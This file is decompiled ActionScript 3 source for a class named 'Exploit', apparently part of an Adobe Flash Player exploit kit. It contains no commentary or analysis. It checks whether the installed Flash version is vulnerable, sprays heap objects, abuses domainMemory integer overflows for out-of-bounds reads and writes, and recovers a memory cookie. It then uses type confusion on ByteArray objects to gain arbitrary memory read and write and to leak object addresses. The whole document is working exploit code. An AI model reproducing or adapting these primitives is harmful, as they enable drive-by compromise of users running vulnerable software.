package
{
   import flash.utils.ByteArray;
   import avm2.intrinsics.memory.li32;
   import avm2.intrinsics.memory.si32;
   import flash.system.ApplicationDomain;
   
   public class Exploit
   {
       
      public var sleep:uint = 0;
      
      public var skip_payload:Boolean = false;
      
      private var starter:Starter = null;
      
      public var var_27:uint = 0;
      
      private var uint1000:uint = 4096;
      
      private var uint200000:uint = 2097152;
      
      private var obj1_len:uint = 20;
      
      private var obj20:Vector.<Object> = null;
      
      private var uintAABBC000:uint = 2864431104;
      
      private var var_213:uint = 524287;
      
      private var vec_uint:Vector.<uint> = null;
      
      private var uint4000:uint = 16384;
      
      private var obj4000:Vector.<Object> = null;
      
      private var be_18_268:Boolean = false;
      
      private var ver19:Boolean = false;
      
      private var cookie:uint = 0;
      
      private var big_ba:ByteArray = null;
      
      private var var_137:uint = 0;
      
      private var ba_conf:ByteArrayConfuser = null;
      
      private var int_overflow:int = -2147483644;
      
      public function Exploit(param1:Starter)
      {
         super();
         this.starter = param1;
      }
      
      public function is_vuln(param1:uint) : Boolean
      {
         var _loc2_:* = undefined;
         var _loc4_:* = false;
         var _loc3_:* = param1;
         try
         {
            if(this.starter.bad_mem)
            {
               var _loc6_:Boolean = false;
               return _loc6_;
            }
            this.ver19 = int(param1 / 1000) == 190000;
            this.be_18_268 = _loc3_ <= 180000268;
            _loc4_ = _loc3_ <= 200000235;
            _loc2_ = _loc4_;
            var _loc7_:* = _loc2_;
            return _loc7_;
         }
         catch(e:Error)
         {
         }
         return false;
      }
      
      public function spray_obj() : Boolean
      {
         this.obj20 = new Vector.<Object>(this.obj1_len);
         this.obj4000 = new Vector.<Object>(this.uint4000);
         return true;
      }
      
      private function add(param1:int) : int
      {
         return param1 + this.int_overflow;
      }
      
      private function li32_overflow(param1:int) : int
      {
         var _loc2_:* = 0;
         var _loc4_:* = 0;
         var _loc3_:int = 0;
         _loc3_ = 2147483644 + this.add(param1);
         _loc4_ = li32(_loc3_);
         _loc3_ = _loc3_ - 2097148;
         _loc2_ = li32(_loc3_);
         _loc3_ = _loc3_ - 4;
         _loc2_ = li32(_loc3_);
         return _loc4_;
      }
      
      private function si32_overflow(param1:int, param2:int) : void
      {
         var _loc4_:* = 0;
         var _loc3_:int = 0;
         _loc3_ = 2147483644 + this.add(param1);
         si32(param2,_loc3_);
         _loc3_ = _loc3_ - 2097148;
         _loc4_ = li32(_loc3_);
         _loc3_ = _loc3_ - 4;
         _loc4_ = li32(_loc3_);
      }
      
      private function read_int_overflow(param1:uint) : uint
      {
         var _loc2_:int = 0;
         var _loc3_:* = 0;
         try
         {
            _loc2_ = param1;
            _loc3_ = uint(this.li32_overflow(_loc2_));
            var _loc5_:* = _loc3_;
            return _loc5_;
         }
         catch(e:Error)
         {
            throw new Error(e.message);
         }
         return 4294967295;
      }
      
      private function write_int_overflow(param1:uint, param2:uint) : void
      {
         var _loc4_:* = param1;
         var _loc3_:* = param2;
         try
         {
            this.si32_overflow(_loc4_,_loc3_);
            return;
         }
         catch(e:Error)
         {
            throw new Error(e.message);
         }
      }
      
      public function read_uint(param1:uint) : uint
      {
         var _loc3_:* = 0;
         var _loc2_:* = param1;
         try
         {
            this.big_ba.position = _loc2_ - 4026531840;
            _loc3_ = uint(this.big_ba.readUnsignedInt());
            var _loc5_:* = _loc3_;
            return _loc5_;
         }
         catch(e:Error)
         {
            throw new Error(e.message);
         }
         return 4294967295;
      }
      
      public function write_uint(param1:uint, param2:uint) : void
      {
         var _loc3_:* = param1;
         var _loc4_:* = param2;
         try
         {
            this.big_ba.position = _loc3_ - 4026531840;
            this.big_ba.writeUnsignedInt(_loc4_);
            return;
         }
         catch(e:Error)
         {
            throw new Error(e.message);
         }
      }
      
      public function read_string(param1:uint, param2:uint) : String
      {
         var _loc4_:* = undefined;
         var _loc6_:* = null;
         var _loc3_:* = param1;
         var _loc5_:* = param2;
         try
         {
            this.big_ba.position = _loc3_ - 4026531840;
            _loc6_ = this.big_ba.readUTFBytes(_loc5_);
            _loc4_ = _loc6_;
            var _loc8_:* = _loc4_;
            return _loc8_;
         }
         catch(e:Error)
         {
            throw new Error(e.message);
         }
         return null;
      }
      
      public function get_obj_addr(param1:Object) : uint
      {
         var _loc3_:* = 0;
         var _loc2_:* = param1;
         try
         {
            this.ba_conf._this = _loc2_;
            _loc3_ = uint(this.read_uint(this.var_137) - 1);
            var _loc5_:* = _loc3_;
            return _loc5_;
         }
         catch(e:Error)
         {
            throw new Error(e.message);
         }
         return 4294967295;
      }
      
      private function fill_obj1() : void
      {
         var _loc1_:uint = 0;
         var _loc2_:* = null;
         try
         {
            while(_loc1_ < this.obj1_len)
            {
               _loc2_ = new ByteArray();
               this.obj20[_loc1_] = _loc2_;
               _loc2_.endian = "littleEndian";
               _loc1_++;
            }
            _loc1_ = 0;
            while(_loc1_ < this.obj1_len)
            {
               _loc2_ = this.obj20[_loc1_];
               _loc2_.length = this.uint200000;
               _loc2_.writeUnsignedInt(4207804416 + _loc1_);
               _loc1_++;
            }
            return;
         }
         catch(e:Error)
         {
            throw new Error(e.message);
         }
      }
      
      private function ba_clear(param1:uint) : void
      {
         var _loc3_:* = undefined;
         var _loc2_:* = param1;
         try
         {
            _loc3_ = this.obj20[_loc2_];
            _loc3_["clear"]();
            this.obj20[_loc2_] = null;
            return;
         }
         catch(e:Error)
         {
            throw new Error(e.message);
         }
      }
      
      private function make_vec_uint() : Vector.<uint>
      {
         var _loc3_:* = 0;
         var _loc1_:* = undefined;
         var _loc2_:* = 0;
         var _loc4_:* = undefined;
         try
         {
            _loc3_ = uint(this.uint1000 / 4);
            _loc1_ = new Vector.<uint>(this.var_213);
            _loc2_ = 0;
            while(_loc2_ < this.var_213)
            {
               _loc1_[_loc2_] = this.uintAABBC000 + _loc2_ * 4 / this.uint1000;
               _loc2_ = uint(_loc2_ + _loc3_);
            }
            var _loc6_:* = _loc1_;
            return _loc6_;
         }
         catch(e:Error)
         {
            throw new Error(e.message);
         }
         return null;
      }
      
      private function get_cookie() : Boolean
      {
         var _loc3_:* = 0;
         var _loc2_:* = 0;
         var _loc7_:* = 0;
         var _loc4_:* = 0;
         var _loc8_:int = 0;
         var _loc1_:int = 0;
         var _loc9_:* = 0;
         var _loc6_:* = 0;
         var _loc5_:* = 0;
         try
         {
            _loc3_ = uint(uint200000);
            if(ver19)
            {
               _loc3_ = uint(_loc3_ + 65536);
            }
            _loc2_ = 0;
            _loc7_ = uint(_loc3_);
            _loc4_ = uint(_loc3_ * 2 - 8);
            while(_loc7_ < _loc4_)
            {
               _loc2_ = uint(this.read_int_overflow(_loc7_ + 4));
               _loc8_ = 4294963200;
               _loc1_ = 4096;
               _loc9_ = uint(_loc2_ & _loc8_);
               if(_loc9_ == this.uintAABBC000)
               {
                  _loc6_ = uint(_loc2_ & _loc1_);
                  _loc5_ = uint(this.read_int_overflow(_loc7_ - _loc6_ * this.uint1000));
                  this.cookie = _loc5_ ^ this.var_213;
                  var _loc11_:Boolean = true;
                  return _loc11_;
               }
               _loc7_ = uint(_loc7_ + this.uint1000);
            }
         }
         catch(e:Error)
         {
            throw new Error(e.message);
         }
         return false;
      }
      
      private function fill_obj4000(param1:uint, param2:uint) : void
      {
         var _loc3_:int = 0;
         var _loc5_:* = param1;
         var _loc4_:* = param2;
         try
         {
            _loc3_ = 0;
            while(_loc3_ < _loc4_)
            {
               this.obj4000[_loc5_] = new ByteArrayConfuser(_loc5_);
               _loc5_++;
               _loc3_++;
            }
            return;
         }
         catch(e:Error)
         {
            throw new Error(e.message);
         }
      }
      
      private function confuse_ba() : Boolean
      {
         var _loc11_:* = 0;
         var _loc4_:* = 0;
         var _loc2_:* = 0;
         var _loc15_:* = 0;
         var _loc12_:int = 0;
         var _loc6_:int = 0;
         var _loc3_:int = 0;
         var _loc13_:* = null;
         var _loc10_:* = 0;
         var _loc9_:* = 0;
         var _loc7_:* = 0;
         var _loc14_:* = 0;
         var _loc8_:* = 0;
         var _loc1_:* = 0;
         var _loc5_:Boolean = false;
         try
         {
            _loc11_ = uint(uint200000);
            if(ver19)
            {
               _loc11_ = uint(_loc11_ + 65504);
            }
            _loc4_ = 0;
            _loc2_ = uint(_loc11_);
            _loc15_ = uint(_loc11_ * 2 - 8);
            _loc12_ = 32;
            _loc6_ = 92;
            _loc3_ = 68;
            if(this.be_18_268)
            {
               _loc6_ = 88;
               _loc3_ = 64;
            }
            _loc13_ = new ByteArrayConfuser(0);
            while(_loc2_ < _loc15_)
            {
               _loc10_ = uint(_loc2_ + _loc12_);
               _loc9_ = uint(_loc10_ + _loc6_);
               _loc4_ = uint(this.read_int_overflow(_loc9_));
               if(_loc4_ == _loc13_.var_150)
               {
                  _loc4_ = uint(this.read_int_overflow(_loc9_ + 60));
                  if(_loc4_ == _loc13_.var_141)
                  {
                     this.var_27 = this.read_int_overflow(_loc2_ + 8);
                     _loc7_ = uint(this.read_int_overflow(_loc2_ + 20) & -4096);
                     _loc14_ = uint(_loc7_ + _loc12_);
                     _loc8_ = uint(_loc14_ + _loc6_);
                     _loc1_ = uint(this.read_int_overflow(_loc9_ + 56));
                     this.ba_conf = this.obj4000[_loc1_] as ByteArrayConfuser;
                     this.var_137 = _loc8_ + 128;
                     if(!this.be_18_268)
                     {
                        this.ba_conf.var_11 = this.ba_conf.var_250 ^ this.cookie;
                        this.ba_conf.var_260 = this.ba_conf.var_318 ^ this.cookie;
                        this.ba_conf.var_39 = this.ba_conf.var_158 ^ this.cookie;
                        this.ba_conf.var_55 = this.ba_conf.var_309 ^ this.cookie;
                     }
                     this.write_int_overflow(_loc10_ + _loc3_,_loc8_);
                     this.big_ba = this.ba_conf;
                     var _loc17_:Boolean = true;
                     return _loc17_;
                  }
               }
               _loc2_ = uint(_loc2_ + this.uint1000);
            }
         }
         catch(e:Error)
         {
            throw new Error(e.message);
         }
         return false;
      }
      
      private function make_big_ba() : Boolean
      {
         var _loc2_:int = 0;
         var _loc1_:* = undefined;
         try
         {
            _loc1_ = ApplicationDomain.currentDomain;
            _loc2_ = this.obj1_len - 4;
            if(this.be_18_268)
            {
               _loc2_ = this.obj1_len - 2;
            }
            if(!this.be_18_268)
            {
               this.ba_clear(_loc2_ + 1);
               _loc1_["domainMemory"] = this.obj20[_loc2_];
               this.vec_uint = this.make_vec_uint();
               if(!this.get_cookie())
               {
                  var _loc4_:Boolean = false;
                  return _loc4_;
               }
               _loc2_ = _loc2_ + 2;
            }
            this.ba_clear(_loc2_ + 1);
            _loc1_["domainMemory"] = this.obj20[_loc2_];
            this.fill_obj4000(0,this.uint4000);
            if(this.confuse_ba())
            {
               var _loc5_:Boolean = true;
               return _loc5_;
            }
         }
         catch(e:Error)
         {
            throw new Error(e.message);
         }
         return false;
      }
      
      public function get_big_ba() : Boolean
      {
         this.fill_obj1();
         if(!this.starter.bad_mem)
         {
            if(!this.make_big_ba())
            {
               return false;
            }
            return true;
         }
         return false;
      }
   }
}
